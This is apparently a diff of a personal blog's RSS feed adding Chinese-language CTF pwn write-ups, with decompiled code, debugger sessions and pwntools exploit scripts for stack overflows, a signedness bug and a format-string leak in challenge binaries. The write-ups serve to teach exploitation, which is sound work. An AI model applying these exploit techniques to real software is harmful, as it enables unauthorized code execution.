@@ -1,4 +1,542 @@
-<?xml version="1.0" encoding="UTF-8"?><rss version="2.0" xmlns:content="http://purl.org/rss/1.0/modules/content/"><channel><title>dxfaker&apos;s blog</title><description>一个默默无闻的小站</description><link>https://dxfaker.top/</link><language>en</language><item><title>2026第一周wp2</title><link>https://dxfaker.top/posts/26moe2/</link><guid isPermaLink="true">https://dxfaker.top/posts/26moe2/</guid><description>你怎么知道我又来拉屎了</description><pubDate>Wed, 09 Sep 2026 00:00:00 GMT</pubDate><content:encoded>&lt;h1&gt;onlyshell&lt;/h1&gt;
+<?xml version="1.0" encoding="UTF-8"?><rss version="2.0" xmlns:content="http://purl.org/rss/1.0/modules/content/"><channel><title>dxfaker&apos;s blog</title><description>一个默默无闻的小站</description><link>https://dxfaker.top/</link><language>en</language><item><title>2026第一周wp</title><link>https://dxfaker.top/posts/26moe3/</link><guid isPermaLink="true">https://dxfaker.top/posts/26moe3/</guid><description>可能这是真的第一次写pwn很舒服吧</description><pubDate>Thu, 10 Sep 2026 00:00:00 GMT</pubDate><content:encoded>&lt;h1&gt;题外话&lt;/h1&gt;
+&lt;p&gt;现在我做封面的技术真的是炉火纯青了&lt;/p&gt;
+&lt;p&gt;听v我写的进度很慢，听方大同写的速度就很快&lt;/p&gt;
+&lt;p&gt;所以拜拜，洛小妹&lt;/p&gt;
+&lt;h1&gt;灯神的愿望&lt;/h1&gt;
+&lt;p&gt;checksec&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;    Arch:       amd64-64-little
+    RELRO:      Full RELRO
+    Stack:      No canary found
+    NX:         NX enabled
+    PIE:        PIE enabled
+    SHSTK:      Enabled
+    IBT:        Enabled
+    Stripped:   No
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;PIE开了说明要找地方泄露地址了&lt;/p&gt;
+&lt;p&gt;来看main函数逻辑&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;int __fastcall __noreturn main(int argc, const char **argv, const char **envp)
+{
+  int v3; // [rsp+4h] [rbp-7Ch] BYREF
+  int v4; // [rsp+8h] [rbp-78h] BYREF
+  unsigned int v5; // [rsp+Ch] [rbp-74h]
+  _BYTE v6[104]; // [rsp+10h] [rbp-70h] BYREF
+  unsigned __int64 v7; // [rsp+78h] [rbp-8h]
+
+  v7 = __readfsqword(0x28u);
+  v5 = 1;
+  init(argc, argv, envp);
+  puts(&quot;Hello, dear pwner! I am Genie Lamp!&quot;);
+  puts(&quot;You can only make ONE wish.&quot;);
+  puts(&quot;What do you want?&quot;);
+  while ( 1 )
+  {
+    while ( 1 )
+    {
+      puts(&amp;amp;byte_2082);
+      puts(&quot;1. Make more wishes&quot;);
+      puts(&quot;2. Make a normal wish&quot;);
+      puts(&quot;3. Get flag&quot;);
+      printf(&quot;&amp;gt; &quot;);
+      __isoc99_scanf(&quot;%d&quot;, &amp;amp;v3);
+      if ( v3 != 1 )
+        break;
+      puts(&quot;How many wishes do you want?&quot;);
+      __isoc99_scanf(&quot;%d&quot;, &amp;amp;v4);
+      if ( v4 &amp;gt; 0 )
+      {
+        puts(&quot;Sorry, you can&apos;t increase wishes.&quot;);
+        exit(0);
+      }
+      v5 = v4;
+      printf(&quot;You can still make %u wishes!\n&quot;, v4);
+    }
+    if ( v3 == 2 )
+      break;
+    if ( v3 == 3 )
+    {
+      if ( v5 &amp;lt;= 0x1BF51 )
+        puts(&quot;Your wishes are not enough...&quot;);
+      else
+        win();
+      exit(0);
+    }
+    puts(&quot;Invalid choice!&quot;);
+  }
+  puts(&quot;Tell me your wish:&quot;);
+  __isoc99_scanf(&quot;%99s&quot;, v6);
+  puts(&quot;Your wish has been granted!&quot;);
+  exit(0);
+}
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;分析逻辑&lt;/p&gt;
+&lt;p&gt;第一轮输入v3&lt;/p&gt;
+&lt;p&gt;v3 == 1：&lt;/p&gt;
+&lt;p&gt;输入v4,v4大于0退出，小于0赋值给v5,打印v4&lt;/p&gt;
+&lt;p&gt;v3 == 2:&lt;/p&gt;
+&lt;p&gt;退出&lt;/p&gt;
+&lt;p&gt;v3 == 3:&lt;/p&gt;
+&lt;p&gt;如果v5的值小于等于1BF51则退出，大于则win()&lt;/p&gt;
+&lt;p&gt;看一眼逻辑&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;int win()
+{
+  puts(&quot;Your endless wishes come true!&quot;);
+  return system(&quot;/bin/sh&quot;);
+}
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;ok,那我们现在的目标就是找到方法让v4赋值给他，不过提示很明显了，给一个负数就结束战斗了&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;pwndbg&amp;gt; c
+Continuing.
+Hello, dear pwner! I am Genie Lamp!
+You can only make ONE wish.
+What do you want?
+
+1. Make more wishes
+2. Make a normal wish
+3. Get flag
+&amp;gt; 2
+Tell me your wish:
+-1
+Your wish has been granted!
+[Inferior 1 (process 9372) exited normally]
+pwndbg&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;payload&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;from pwn import *
+p = process(&apos;./pwn&apos;)
+
+p.recvuntil(b&quot;&amp;gt; &quot;)
+p.sendline(b&apos;1&apos;)
+p.recvuntil(b&quot;How many wishes do you want?&quot;)
+p.sendline(b&apos;-1&apos;)
+p.interactive()
+&lt;/code&gt;&lt;/pre&gt;
+&lt;pre&gt;&lt;code&gt; python3 reslo.py
+[+] Starting local process &apos;./pwn&apos;: pid 9957
+[*] Switching to interactive mode
+
+You can still make 4294967295 wishes!
+
+1. Make more wishes
+2. Make a normal wish
+3. Get flag
+&amp;gt; $ 3
+Your endless wishes come true!
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h1&gt;百万英镑&lt;/h1&gt;
+&lt;p&gt;checksec&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;    Arch:       amd64-64-little
+    RELRO:      Partial RELRO
+    Stack:      No canary found
+    NX:         NX enabled
+    PIE:        No PIE (0x400000)
+    SHSTK:      Enabled
+    IBT:        Enabled
+    Stripped:   No
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;没有canary和PIE&lt;/p&gt;
+&lt;p&gt;看main&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;int __fastcall main(int argc, const char **argv, const char **envp)
+{
+  _BYTE v4[103]; // [rsp+0h] [rbp-70h] BYREF
+  unsigned __int8 v5; // [rsp+67h] [rbp-9h]
+  unsigned __int64 number; // [rsp+68h] [rbp-8h]
+
+  initialise();
+  puts(&quot;== million pound ==&quot;);
+  puts(&quot;I want one fine million-pound cheque,&quot;);
+  puts(&quot;one brand-new million-pound cheque,&quot;);
+  puts(&quot;all the exquisite million-pound cheques,&quot;);
+  puts(&quot;a few more million-pound cheques on top,&quot;);
+  puts(&quot;and another million-pound cheque fresh off the press.&quot;);
+  puts(&quot;That is rather a lot of cheques, sir.&quot;);
+  printf(&quot;How many should I prepare? &quot;);
+  number = read_number();
+  v5 = cheque_bytes(number);
+  if ( v5 &amp;lt;= 0x60u )
+  {
+    printf(&quot;What would you like written, sir? &quot;);
+    read_exact(0, v4, 8 * number);
+    puts(&quot;Very good, sir.&quot;);
+  }
+  else
+  {
+    puts(&quot;That would draw too much attention, sir.&quot;);
+  }
+  return 0;
+}
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;然后看functions表&lt;/p&gt;
+&lt;p&gt;查看老演员staff room&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;int staff_room()
+{
+  char *argv[2]; // [rsp+0h] [rbp-10h] BYREF
+
+  argv[0] = &quot;/bin/sh&quot;;
+  argv[1] = 0;
+  return execve(&quot;/bin/sh&quot;, argv, 0);
+}
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;ok现在归纳一下逻辑思路&lt;/p&gt;
+&lt;p&gt;第一轮输入决定长度，第二轮输入决定内容&lt;/p&gt;
+&lt;p&gt;长度限制为0x60,内容可输入8*长度&lt;/p&gt;
+&lt;p&gt;v4的长度为103,位于7*16=112&lt;/p&gt;
+&lt;p&gt;且8x6x16明显大于112，所以我可以造一个栈溢出来跳转&lt;/p&gt;
+&lt;p&gt;payload=112+8(saved rbp) + 地址&lt;/p&gt;
+&lt;p&gt;由于长度，我们可以设一个大一点的剩下没利用的字节就利用垃圾数据填充&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;from pwn import *
+
+# p = remote(&quot;127.0.0.1&quot;, 51742)
+p = process(&apos;./million-pound&apos;)
+p.recvuntil(b&apos;How many should I prepare? &apos;)
+p.sendline(b&apos;32&apos;)
+
+win = 0x401394
+payload = b&apos;A&apos; * 120 + p64(win)
+p.recvuntil(b&apos;What would you like written, sir? &apos;)
+payload += b&apos;B&apos; * (256 - len(payload))
+p.send(payload)
+p.interactive()
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h1&gt;校庆抽奖后台&lt;/h1&gt;
+&lt;p&gt;checksec&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;    Arch:       amd64-64-little
+    RELRO:      Full RELRO
+    Stack:      Canary found
+    NX:         NX enabled
+    PIE:        PIE enabled
+    SHSTK:      Enabled
+    IBT:        Enabled
+    Stripped:   No
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;开PIE说明要去找地方泄露真实地址了,哦对了，还有四凤金丝雀&lt;/p&gt;
+&lt;p&gt;再看main函数逻辑&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;int __fastcall main(int argc, const char **argv, const char **envp)
+{
+  __int64 v3; // rax
+  unsigned __int16 v5; // [rsp+6h] [rbp-Ah] BYREF
+  unsigned __int64 v6; // [rsp+8h] [rbp-8h]
+
+  v6 = __readfsqword(0x28u);
+  setvbuf(stdin, 0, 2, 0);
+  setvbuf(stdout, 0, 2, 0);
+  alarm(0x1Eu);
+  puts(&quot;=== Anniversary Lottery Admin Debug ===&quot;);
+  v3 = stack_guard();
+  printf(&quot;[trace] active record: %p :: 0x%016lx\n&quot;, award_jackpot, v3);
+  puts(&quot;[lottery] Submit a two-byte little-endian claim packet length.&quot;);
+  puts(&quot;[lottery] Send claim packet:&quot;);
+  read_exact((char *)&amp;amp;v5, 2u);
+  if ( v5 &amp;amp;&amp;amp; v5 &amp;lt;= 0x100u )
+  {
+    submit_claim(v5);
+    return 0;
+  }
+  else
+  {
+    puts(&quot;[lottery] Invalid claim packet length.&quot;);
+    return 0;
+  }
+}
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;点击award_jackpot去看逻辑&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;unsigned __int64 award_jackpot()
+{
+  int fd; // [rsp+4h] [rbp-9Ch]
+  ssize_t n; // [rsp+8h] [rbp-98h]
+  _QWORD buf[17]; // [rsp+10h] [rbp-90h] BYREF _QWORD 在 64 位程序中表示 8 字节。buf[17] 的总大小 = 17 × 8 = 136 字节。read 的长度参数 0x7F = 127 字节。
+  unsigned __int64 v4; // [rsp+98h] [rbp-8h]
+
+  v4 = __readfsqword(0x28u);
+  memset(buf, 0, 128);
+  fd = open(&quot;/flag&quot;, 0);
+  if ( fd &amp;lt; 0 )
+  {
+    puts(&quot;[lottery] Prize record unavailable.&quot;);
+    exit(1);
+  }
+  n = read(fd, buf, 0x7Fu);
+  if ( n &amp;gt; 0 )
+  {
+    write(1, &quot;[lottery] Jackpot awarded: &quot;, 0x1Bu);
+    write(1, buf, n);
+  }
+  close(fd);
+  return v4 - __readfsqword(0x28u);
+}
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;这不都有flag了吗，&lt;/p&gt;
+&lt;p&gt;&lt;s&gt;现在是11.41分经过了一段时间的水群以及观察函数逻辑之后，我并没有发现漏洞函数&lt;/s&gt;&lt;/p&gt;
+&lt;p&gt;核心问题&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;&lt;code&gt;submit_claim&lt;/code&gt; 的参数 &lt;code&gt;a1&lt;/code&gt; 类型是 &lt;code&gt;size_t&lt;/code&gt;，但在 &lt;code&gt;main&lt;/code&gt; 中传入的是 &lt;code&gt;v5&lt;/code&gt;，而 &lt;code&gt;v5&lt;/code&gt; 是 &lt;code&gt;unsigned __int16&lt;/code&gt;（2 字节）。这里发生了&lt;strong&gt;整数提升/零扩展&lt;/strong&gt;：&lt;code&gt;v5&lt;/code&gt; 的值（0~65535）被转换为 &lt;code&gt;size_t&lt;/code&gt;（64 位无符号）时，高位补 0，因此 &lt;code&gt;a1&lt;/code&gt; 的值就等于 &lt;code&gt;v5&lt;/code&gt; 的值。&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;我的理解是v5传递进去之后取了他的长度，但是明显是错误的，可能睡觉时间要到的人就昏头了吧（&lt;/p&gt;
+&lt;p&gt;v5的长度是又我决定，而v2只有72字节，那不就大大方方栈溢出了&lt;/p&gt;
+&lt;p&gt;而且main函数还有自杀式的打印真实地址+金丝雀的行为，拿条件都符合条件了&lt;/p&gt;
+&lt;p&gt;现在算payload&lt;/p&gt;
+&lt;p&gt;payload = 72 + canary+ + savedrbp + 后门地址&lt;/p&gt;
+&lt;p&gt;exp&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;from pwn import *
+
+context.arch = &quot;amd64&quot;
+context.log_level = &quot;info&quot;
+
+p = remote(&quot;127.0.0.1&quot;, 63440)
+
+p.recvuntil(b&quot;[trace] active record: &quot;)
+leak = p.recvline().strip()
+log.info(f&quot;leak line: {leak}&quot;)
+win = int(leak.split(b&quot; ::&quot;)[0], 16)
+canary = int(leak.split(b&quot;:: 0x&quot;)[1], 16)
+
+log.success(f&quot;win    = {hex(win)}&quot;)
+log.success(f&quot;canary = {hex(canary)}&quot;)
+p.recvuntil(b&quot;[lottery] Send claim packet:&quot;)
+size = 0x60
+p.send(p16(size))
+payload = b&apos;A&apos; * 72 + p64(canary) + b&apos;A&apos; * 8 + p64(win)
+
+p.send(payload)
+
+p.interactive()
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;你别说，加log还能看是哪出问题的&lt;/p&gt;
+&lt;p&gt;晚安，周末有事，估计暂时更新不了了&lt;/p&gt;
+</content:encoded></item><item><title>printf的小巧思</title><link>https://dxfaker.top/posts/printf/</link><guid isPermaLink="true">https://dxfaker.top/posts/printf/</guid><description>你怎么知道我又来拉屎了</description><pubDate>Thu, 10 Sep 2026 00:00:00 GMT</pubDate><content:encoded>&lt;h1&gt;写在前面&lt;/h1&gt;
+&lt;p&gt;这个是25新生赛的题，一开始我以为UAF，但是后面发现他只用了堆，然后就以为可以通过格式化字符串漏洞来打，再到后面发现我又错了，看来还得练啊&lt;/p&gt;
+&lt;h1&gt;正文&lt;/h1&gt;
+&lt;pre&gt;&lt;code&gt;int __fastcall __noreturn main(int argc, const char **argv, const char **envp)
+{
+  __int64 v3; // [rsp+0h] [rbp-20h] BYREF
+  __int64 buf; // [rsp+8h] [rbp-18h] BYREF
+  char *format; // [rsp+10h] [rbp-10h]
+  int fd; // [rsp+1Ch] [rbp-4h]
+
+  init(argc, argv, envp);
+  buf = 0;
+  v3 = 0;
+  fd = open(&quot;/dev/urandom&quot;, 0);
+  if ( fd &amp;lt; 0 )
+  {
+    perror(&quot;Failed to open /dev/urandom&quot;);
+    exit(-1);
+  }
+  read(fd, &amp;amp;buf, 8u);
+  close(fd);
+  format = (char *)malloc(0x100u);
+  printf(&quot;User name: &quot;);
+  __isoc99_scanf(&quot;%255s&quot;, format);
+  puts(&quot;Hello, &quot;);
+  printf(format);
+  printf(&quot;\nPassword: &quot;);
+  __isoc99_scanf(&quot;%lld&quot;, &amp;amp;v3);
+  if ( v3 == buf )
+  {
+    puts(&quot;Login successful!&quot;);
+    system(&quot;/bin/sh&quot;);
+  }
+  else
+  {
+    puts(&quot;Login failed!&quot;);
+  }
+  free(format);
+  exit(0);
+}
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;先看main函数逻辑&lt;/p&gt;
+&lt;p&gt;省流:开了一个文件读了一串字节，然后进行对比，相同就可以直接get shell&lt;/p&gt;
+&lt;p&gt;可是现在的问题是我哪知道他读的是哪里的文件，然后是有一个输入format存储到堆上的操作&lt;/p&gt;
+&lt;p&gt;然后checksec&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;    Arch:       amd64-64-little
+    RELRO:      Partial RELRO
+    Stack:      No canary found
+    NX:         NX enabled
+    PIE:        No PIE (0x400000)
+    Stripped:   No
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;只开了NX&lt;/p&gt;
+&lt;p&gt;那就看向唯一能操作的地方&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt; format = (char *)malloc(0x100u);
+  printf(&quot;User name: &quot;);
+  __isoc99_scanf(&quot;%255s&quot;, format);
+  puts(&quot;Hello, &quot;);
+  printf(format);
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;复习一下printf操作&lt;/p&gt;
+&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;格式符&lt;/th&gt;
+&lt;th&gt;含义&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;code&gt;%d&lt;/code&gt; / &lt;code&gt;%i&lt;/code&gt;&lt;/td&gt;
+&lt;td&gt;有符号十进制整数&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;code&gt;%u&lt;/code&gt;&lt;/td&gt;
+&lt;td&gt;无符号十进制整数&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;code&gt;%x&lt;/code&gt; / &lt;code&gt;%X&lt;/code&gt;&lt;/td&gt;
+&lt;td&gt;十六进制整数&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;code&gt;%p&lt;/code&gt;&lt;/td&gt;
+&lt;td&gt;指针地址（十六进制）&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;code&gt;%s&lt;/code&gt;&lt;/td&gt;
+&lt;td&gt;字符串（从参数指向的地址读取）&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;code&gt;%c&lt;/code&gt;&lt;/td&gt;
+&lt;td&gt;字符&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;code&gt;%n&lt;/code&gt;&lt;/td&gt;
+&lt;td&gt;&lt;strong&gt;将已打印字符数写入参数指向的地址&lt;/strong&gt;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;code&gt;%hhn&lt;/code&gt;&lt;/td&gt;
+&lt;td&gt;写 1 字节&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;code&gt;%hn&lt;/code&gt;&lt;/td&gt;
+&lt;td&gt;写 2 字节&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;code&gt;%lln&lt;/code&gt;&lt;/td&gt;
+&lt;td&gt;写 8 字节&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;p&gt;以及经典的格式化字符串漏洞&lt;/p&gt;
+&lt;p&gt;format可以输入%p%s%n,以达到信息泄露以及任意内存写的操作&lt;/p&gt;
+&lt;p&gt;而且你看栈布局&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;__int64 v3;    // [rsp+0h]  [rbp-20h]
+__int64 buf;   // [rsp+8h]  [rbp-18h]
+char *format;  // [rsp+10h] [rbp-10h]
+
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;format紧接着要对比的buf以及v3&lt;/p&gt;
+&lt;p&gt;再回顾printf的操作中可以读任意地址的%7$llx,那我是不是可以尝试一下把buf的数据读出来，那不就可以在下一次输入的时候使其相同，那不就结束战斗了&lt;/p&gt;
+&lt;p&gt;不开tmux&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;pwndbg&amp;gt; break *0x4012da
+Breakpoint 1 at 0x4012da
+pwndbg&amp;gt; run &amp;lt; in.txt
+Starting program: /mnt/d/ctf/flag/pwn/aurora25/guess v2.0/guess2 &amp;lt; in.txt
+[Thread debugging using libthread_db enabled]
+Using host libthread_db library &quot;/lib/x86_64-linux-gnu/libthread_db.so.1&quot;.
+User name: Hello,
+
+Breakpoint 1, 0x00000000004012da in main ()
+
+LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
+─────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]─────────────────────────────────
+ RAX  0
+ RBX  0x7fffffffd9f8 —▸ 0x7fffffffdcfd ◂— &apos;/mnt/d/ctf/flag/pwn/aurora25/guess v2.0/guess2&apos;
+ RCX  0x7ffff7d1c6a4 (write+20) ◂— cmp rax, -0x1000 /* &apos;H=&apos; */
+ RDX  0
+ RDI  0x4052a0 ◂— 0x786c6c243725 /* &apos;%7$llx&apos; */
+ RSI  0x7ffff7e04643 (_IO_2_1_stdout_+131) ◂— 0xe05710000000000a /* &apos;\n&apos; */
+ R8   7
+ R9   0xff
+ R10  0x7ffff7c0abe8 ◂— 0x11002200006cb5
+ R11  0x202
+ R12  1
+ R13  0
+ R14  0x403e00 (__do_global_dtors_aux_fini_array_entry) —▸ 0x4011a0 (__do_global_dtors_aux) ◂— endbr64
+ R15  0x7ffff7ffd000 (_rtld_global) —▸ 0x7ffff7ffe2e0 ◂— 0
+ RBP  0x7fffffffd8d0 —▸ 0x7fffffffd970 —▸ 0x7fffffffd9d0 ◂— 0
+ RSP  0x7fffffffd8b0 ◂— 0
+ RIP  0x4012da (main+213) ◂— call printf@plt
+──────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]──────────────────────────────────────────
+b► 0x4012da &amp;lt;main+213&amp;gt;    call   printf@plt                  &amp;lt;printf@plt&amp;gt;
+
+   0x4012df &amp;lt;main+218&amp;gt;    lea    rax, [rip + 0xd61]     RAX =&amp;gt; 0x402047 ◂— &apos;\nPassword: &apos;
+   0x4012e6 &amp;lt;main+225&amp;gt;    mov    rdi, rax               RDI =&amp;gt; 0x402047 ◂— &apos;\nPassword: &apos;
+   0x4012e9 &amp;lt;main+228&amp;gt;    mov    eax, 0                 EAX =&amp;gt; 0
+   0x4012ee &amp;lt;main+233&amp;gt;    call   printf@plt                  &amp;lt;printf@plt&amp;gt;
+
+   0x4012f3 &amp;lt;main+238&amp;gt;    lea    rax, [rbp - 0x20]
+   0x4012f7 &amp;lt;main+242&amp;gt;    mov    rsi, rax
+   0x4012fa &amp;lt;main+245&amp;gt;    lea    rax, [rip + 0xd52]     RAX =&amp;gt; 0x402053 ◂— 0x676f4c00646c6c25 /* &apos;%lld&apos; */
+   0x401301 &amp;lt;main+252&amp;gt;    mov    rdi, rax               RDI =&amp;gt; 0x402053 ◂— 0x676f4c00646c6c25 /* &apos;%lld&apos; */
+   0x401304 &amp;lt;main+255&amp;gt;    mov    eax, 0                 EAX =&amp;gt; 0
+   0x401309 &amp;lt;main+260&amp;gt;    call   __isoc99_scanf@plt          &amp;lt;__isoc99_scanf@plt&amp;gt;
+───────────────────────────────────────────────────────[ STACK ]────────────────────────────────────────────────────────
+00:0000│ rsp 0x7fffffffd8b0 ◂— 0
+01:0008│-018 0x7fffffffd8b8 ◂— 0x710900f23a7475a1
+02:0010│-010 0x7fffffffd8c0 —▸ 0x4052a0 ◂— 0x786c6c243725 /* &apos;%7$llx&apos; */
+03:0018│-008 0x7fffffffd8c8 ◂— 0x3ffffd9f8
+04:0020│ rbp 0x7fffffffd8d0 —▸ 0x7fffffffd970 —▸ 0x7fffffffd9d0 ◂— 0
+05:0028│+008 0x7fffffffd8d8 —▸ 0x7ffff7c2a1ca (__libc_start_call_main+122) ◂— mov edi, eax
+06:0030│+010 0x7fffffffd8e0 —▸ 0x7fffffffd920 —▸ 0x403e00 (__do_global_dtors_aux_fini_array_entry) —▸ 0x4011a0 (__do_global_dtors_aux) ◂— endbr64
+07:0038│+018 0x7fffffffd8e8 —▸ 0x7fffffffd9f8 —▸ 0x7fffffffdcfd ◂— &apos;/mnt/d/ctf/flag/pwn/aurora25/guess v2.0/guess2&apos;
+─────────────────────────────────────────────────────[ BACKTRACE ]──────────────────────────────────────────────────────
+ ► 0 0x4012da       main+213
+   1 0x7ffff7c2a1ca __libc_start_call_main+122
+   2 0x7ffff7c2a28b __libc_start_main+139
+   3 0x401111       _start+33
+pwndbg&amp;gt;
+
+
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;可以看到rbp-0x8、rbp-0x10、rbp-0x18&lt;/p&gt;
+&lt;p&gt;fmtdump / fmtarg：栈上的第 N 格&quot;直接翻译成&quot;printf 的第 %N$ 个参数&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;pwndbg&amp;gt; fmtdump 8
+%-6$  0x0000000000000000 #v3
+%-7$  0x710900f23a7475a1 #buf
+%-8$  0x00000000004052a0 #format
+%-9$  0x00000003ffffd9f8
+%-10$  0x00007fffffffd970
+%-11$  0x00007ffff7c2a1ca
+%-12$  0x00007fffffffd920
+%-13$  0x00007fffffffd9f8
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;x86-64 下第 1~5 个变参走 rsi/rdx/rcx/r8/r9,第 6 个起走栈, 也就是调用者 rsp+0 / rsp+8 / ...:&lt;/p&gt;
+&lt;p&gt;所以就可以动手写exp了&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;from pwn import *
+
+context(arch=&apos;amd64&apos;, os=&apos;linux&apos;, log_level=&apos;info&apos;)
+
+LOCAL = True      
+HOST, PORT = &apos;node.szu.moe&apos;, 10053
+
+elf = ELF(&apos;./guess2&apos;)
+
+
+def u64s(x):
+    return x - (1 &amp;lt;&amp;lt; 64) if x &amp;gt;= (1 &amp;lt;&amp;lt; 63) else x
+
+
+def main():
+    io = process(elf.path) if LOCAL else remote(HOST, PORT)
+
+    io.sendlineafter(b&apos;User name: &apos;, b&apos;%7$llx&apos;)
+    io.recvuntil(b&apos;Hello, \n&apos;)
+    buf = u64s(int(io.recvuntil(b&apos;\n&apos;, drop=True).strip(), 16))
+
+    io.sendlineafter(b&apos;Password: &apos;, str(buf).encode())
+
+    io.interactive()
+
+
+if __name__ == &apos;__main__&apos;:
+    main()
+&lt;/code&gt;&lt;/pre&gt;
+&lt;blockquote&gt;
+&lt;p&gt;把 64 位无符号整数转成有符号：&lt;/p&gt;
+&lt;p&gt;若最高位为 1（x &amp;gt;= 2^63），减去 2^64 变成负数
+否则原样返回
+为什么必须做：printf(&quot;%llx&quot;) 把随机数按无符号打印（如 14346747841414464070），而 scanf(&quot;%lld&quot;) 是有符号解析，最大只接受 9223372036854775807。直接发会解析溢出 → v3 != buf → 登录失败。&lt;/p&gt;
+&lt;p&gt;随机数最高位为 1 的概率是 50%，所以这函数直接决定成功率是 50% 还是 100%。&lt;/p&gt;
+&lt;/blockquote&gt;
+</content:encoded></item><item><title>2026第一周wp2</title><link>https://dxfaker.top/posts/26moe2/</link><guid isPermaLink="true">https://dxfaker.top/posts/26moe2/</guid><description>你怎么知道我又来拉屎了</description><pubDate>Wed, 09 Sep 2026 00:00:00 GMT</pubDate><content:encoded>&lt;h1&gt;onlyshell&lt;/h1&gt;
 &lt;p&gt;checksec&lt;/p&gt;
 &lt;pre&gt;&lt;code&gt; Arch:       amd64-64-little
     RELRO:      Full RELRO
